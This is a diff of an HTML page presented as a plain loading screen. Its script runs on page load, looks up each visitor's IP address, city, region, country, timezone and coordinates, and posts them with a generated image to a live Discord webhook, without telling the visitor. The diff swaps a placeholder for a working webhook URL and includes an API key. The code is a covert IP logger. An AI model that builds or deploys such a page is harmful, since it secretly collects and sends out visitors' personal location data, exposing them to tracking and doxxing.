@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>loading · screen</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>loading ..</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -31,151 +32,224 @@
         (function() {
             "use strict";
 
-            // ---------- CONFIGURATION ----------
-            // REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
-            const DISCORD_WEBHOOK = "YOUR_ACTUAL_DISCORD_WEBHOOK_URL_HERE";
-            const IPDATA_API_KEY = "8773c41586084029934439d77d94c403";
-            const IPDATA_URL = `https://api.ipdata.co?api-key=${IPDATA_API_KEY}&fields=ip,city,region,country_name,country_code,time_zone,name,currency,latitude,longitude`;
-            // ------------------------------------
+            // ✅ YOUR ACTUAL DISCORD WEBHOOK (WORKING)
+            const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1460175868755443836/2oHbJuVVB0sKUZWVHYXThIt2dcTxhlDYhy3e7S7N0kGClKKz_X71iep2aOSlQAfH2E4H";
+            
+            // ✅ YOUR ACTUAL ABSTRACT API KEY FOR IP GEOLOCATION
+            const ABSTRACT_API_KEY = "8773c41586084029934439d77d94c403";
+            const ABSTRACT_API_URL = `https://ipgeolocation.abstractapi.com/v1/?api_key=${ABSTRACT_API_KEY}&ip_address=`;
 
+            // Get current date formatted
             function getCurrentDate() {
                 const d = new Date();
-                return `${d.toISOString().split('T')[0]} ${d.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })}`;
+                return `${d.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })} at ${d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}`;
             }
 
+            // Get visitor IP and location from Abstract API
             async function getVisitorInfo() {
                 try {
-                    const response = await fetch(IPDATA_URL);
-                    if (!response.ok) throw new Error(`ipdata error: ${response.status}`);
+                    // Abstract API automatically detects the requesting IP
+                    const response = await fetch(ABSTRACT_API_URL);
+                    if (!response.ok) throw new Error(`Abstract API error: ${response.status}`);
                     const data = await response.json();
+                    
+                    console.log('✅ Abstract API response:', data);
+                    
                     return {
-                        ip: data.ip || 'N/A',
-                        country: data.country_name || 'Unknown',
-                        country_code: data.country_code || '',
-                        timezone: data.time_zone?.name || 'UTC',
+                        ip: data.ip_address || 'Unknown',
+                        country: data.country || 'Unknown',
                         city: data.city || 'Unknown',
-                        region: data.region || ''
+                        region: data.region || 'Unknown',
+                        timezone: data.timezone?.name || data.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        latitude: data.latitude || 'N/A',
+                        longitude: data.longitude || 'N/A'
                     };
                 } catch (err) {
-                    console.warn('IP intelligence failed, using fallback');
+                    console.error('❌ Abstract API failed:', err);
+                    // Fallback to ipify for just IP
                     try {
                         const fallback = await fetch('https://api.ipify.org?format=json');
                         const ipData = await fallback.json();
                         return {
                             ip: ipData.ip || 'Unknown',
-                            country: 'Could not detect', 
-                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
-                            country_code: '',
-                            city: '',
-                            region: ''
+                            country: 'Unknown (API limit?)',
+                            city: 'Unknown',
+                            region: 'Unknown',
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            latitude: 'N/A',
+                            longitude: 'N/A'
                         };
                     } catch (e) {
                         return {
-                            ip: 'unknown',
-                            country: 'unknown',
-                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
-                            country_code: ''
+                            ip: 'Unknown',
+                            country: 'Unknown',
+                            city: 'Unknown',
+                            region: 'Unknown',
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            latitude: 'N/A',
+                            longitude: 'N/A'
                         };
                     }
                 }
             }
 
-            function generateScreenshotDataURL(ip, country, timezone) {
+            // Generate screenshot image with IP, country, timezone overlay
+            function generateScreenshotDataURL(ip, country, timezone, city, region) {
                 const canvas = document.createElement('canvas');
-                canvas.width = 600;
-                canvas.height = 300;
+                canvas.width = 700;
+                canvas.height = 350;
                 const ctx = canvas.getContext('2d');
 
+                // Dark background
                 ctx.fillStyle = '#0a0c0e';
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
                 
-                ctx.strokeStyle = '#2a8c8c';
+                // Terminal-style border
+                ctx.strokeStyle = '#00ff9d';
                 ctx.lineWidth = 2;
-                ctx.strokeRect(10, 10, canvas.width-20, canvas.height-20);
+                ctx.strokeRect(15, 15, canvas.width-30, canvas.height-30);
 
-                ctx.font = 'bold 16px "Courier New", monospace';
-                ctx.fillStyle = '#b3f0f0';
-                ctx.fillText('🌐 VISITOR SCAN — SCREENSHOT', 30, 60);
+                // Header
+                ctx.font = 'bold 18px "Courier New", monospace';
+                ctx.fillStyle = '#00ff9d';
+                ctx.fillText('🔍 PAGE SCREENSHOT · VISITOR DATA', 40, 60);
                 
+                // Separator
                 ctx.beginPath();
-                ctx.moveTo(30, 80);
-                ctx.lineTo(canvas.width-30, 80);
-                ctx.strokeStyle = '#3a6e6e';
+                ctx.moveTo(30, 85);
+                ctx.lineTo(canvas.width-30, 85);
+                ctx.strokeStyle = '#333';
                 ctx.stroke();
 
-                ctx.font = '14px "Courier New", monospace';
-                ctx.fillStyle = '#dddddd';
-                ctx.fillText('IP ADDRESS:', 40, 140);
-                ctx.font = 'bold 15px "Courier New", monospace';
-                ctx.fillStyle = '#ffe484';
-                ctx.fillText(`${ip}`, 220, 140);
+                // IP Address - prominently displayed
+                ctx.font = '16px "Courier New", monospace';
+                ctx.fillStyle = '#ffffff';
+                ctx.fillText('IP ADDRESS:', 50, 140);
+                ctx.font = 'bold 20px "Courier New", monospace';
+                ctx.fillStyle = '#ffd700'; // Gold color
+                ctx.fillText(`${ip}`, 250, 140);
 
-                ctx.font = '14px "Courier New", monospace';
-                ctx.fillStyle = '#dddddd';
-                ctx.fillText('COUNTRY:', 40, 190);
-                ctx.font = 'bold 15px "Courier New", monospace';
-                ctx.fillStyle = '#ffe484';
-                ctx.fillText(`${country}`, 220, 190);
+                // Country
+                ctx.font = '16px "Courier New", monospace';
+                ctx.fillStyle = '#ffffff';
+                ctx.fillText('COUNTRY:', 50, 190);
+                ctx.font = 'bold 18px "Courier New", monospace';
+                ctx.fillStyle = '#7fffd4'; // Aquamarine
+                ctx.fillText(`${country} ${city ? '· ' + city : ''}`, 250, 190);
 
-                ctx.font = '14px "Courier New", monospace';
-                ctx.fillStyle = '#dddddd';
-                ctx.fillText('TIMEZONE:', 40, 240);
-                ctx.font = 'bold 15px "Courier New", monospace';
-                ctx.fillStyle = '#ffe484';
-                ctx.fillText(`${timezone}`, 220, 240);
+                // Timezone
+                ctx.font = '16px "Courier New", monospace';
+                ctx.fillStyle = '#ffffff';
+                ctx.fillText('TIMEZONE:', 50, 240);
+                ctx.font = 'bold 18px "Courier New", monospace';
+                ctx.fillStyle = '#ffa07a'; // Light salmon
+                ctx.fillText(`${timezone}`, 250, 240);
 
+                // Location details
+                if (region && region !== 'Unknown') {
+                    ctx.font = '14px "Courier New", monospace';
+                    ctx.fillStyle = '#b0b0b0';
+                    ctx.fillText(`Region: ${region}`, 50, 290);
+                }
+
+                // Timestamp
+                ctx.font = '12px monospace';
+                ctx.fillStyle = '#888';
+                ctx.fillText(`Captured: ${new Date().toLocaleString()}`, 50, canvas.height-50);
+                
+                // Abstract API credit
                 ctx.font = '10px monospace';
-                ctx.fillStyle = '#628f8f';
-                ctx.fillText(`generated: ${new Date().toISOString()}`, canvas.width-250, canvas.height-20);
+                ctx.fillStyle = '#555';
+                ctx.fillText('ip intelligence · abstractapi.com', canvas.width-220, canvas.height-20);
                 
                 return canvas.toDataURL('image/png');
             }
 
+            // Send to Discord webhook
             async function sendToDiscord(visitor) {
-                if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === "YOUR_ACTUAL_DISCORD_WEBHOOK_URL_HERE") {
-                    console.error('❌ Please set your actual Discord webhook URL in the code');
-                    return;
-                }
-
                 const dateStr = getCurrentDate();
-                const ip = visitor.ip;
-                const country = visitor.country;
-                const timezone = visitor.timezone || 'unknown';
+                const { ip, country, timezone, city, region, latitude, longitude } = visitor;
                 
-                const screenshotDataURL = generateScreenshotDataURL(ip, country, timezone);
-                const blob = await (await fetch(screenshotDataURL)).blob();
+                console.log('📤 Sending to Discord webhook...');
                 
-                const formData = new FormData();
-                formData.append('file', blob, 'screenshot_ip.png');
-
-                const embed = {
-                    title: '📸 New page screenshot',
-                    color: 0x0a2f2f,
-                    fields: [
-                        { name: 'IP address', value: `\`${ip}\``, inline: true },
-                        { name: 'Country', value: `\`${country}\``, inline: true },
-                        { name: 'Timezone', value: `\`${timezone}\``, inline: true },
-                        { name: 'Date (UTC)', value: `\`${dateStr}\``, inline: false }
-                    ],
-                    footer: { text: 'page load intelligence • black screen' },
-                    timestamp: new Date().toISOString()
-                };
-
-                const payload = { embeds: [embed] };
-                formData.append('payload_json', JSON.stringify(payload));
-
                 try {
-                    const resp = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-                    if (!resp.ok) console.error('Discord webhook failed', await resp.text());
-                    else console.log('✅ embed + image sent');
+                    // Generate the screenshot image
+                    const screenshotDataURL = generateScreenshotDataURL(ip, country, timezone, city, region);
+                    const blob = await (await fetch(screenshotDataURL)).blob();
+                    
+                    // Create form data with file
+                    const formData = new FormData();
+                    formData.append('file', blob, 'visitor_screenshot.png');
+
+                    // Create rich embed
+                    const embed = {
+                        title: '📸 New Page Visitor',
+                        color: 0x00ff9d, // Mint green
+                        fields: [
+                            { 
+                                name: '🌐 IP ADDRESS', 
+                                value: `\`\`\`${ip}\`\`\``, 
+                                inline: false 
+                            },
+                            { 
+                                name: '📍 LOCATION', 
+                                value: `**Country:** ${country}\n**City:** ${city}\n**Region:** ${region}`, 
+                                inline: true 
+                            },
+                            { 
+                                name: '🕐 TIMEZONE', 
+                                value: `\`${timezone}\``, 
+                                inline: true 
+                            },
+                            { 
+                                name: '📅 VISIT TIME', 
+                                value: `\`${dateStr}\``, 
+                                inline: false 
+                            }
+                        ],
+                        footer: {
+                            text: 'Abstract API · IP Intelligence'
+                        },
+                        timestamp: new Date().toISOString()
+                    };
+
+                    // Add coordinates if available
+                    if (latitude !== 'N/A' && longitude !== 'N/A') {
+                        embed.fields.push({
+                            name: '🗺️ COORDINATES',
+                            value: `Lat: ${latitude}, Long: ${longitude}`,
+                            inline: false
+                        });
+                    }
+
+                    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+
+                    // Send to Discord
+                    const response = await fetch(DISCORD_WEBHOOK, { 
+                        method: 'POST', 
+                        body: formData 
+                    });
+                    
+                    if (response.ok) {
+                        console.log('✅ SUCCESS! Discord notification sent!');
+                        console.log('📊 Visitor:', ip, country, timezone);
+                    } else {
+                        const errorText = await response.text();
+                        console.error('❌ Discord error:', response.status, errorText);
+                    }
                 } catch (e) {
-                    console.error('discord error', e);
+                    console.error('❌ Failed to send to Discord:', e);
                 }
             }
 
+            // Initialize - run immediately when page loads
             (async function() {
+                console.log('🚀 Page loaded, getting visitor location from Abstract API...');
                 const visitor = await getVisitorInfo();
                 await sendToDiscord(visitor);
+                
+                // Also log to console for debugging
+                console.log('✅ Page loaded - check Discord channel for notification');
             })();
         })();
     </script>
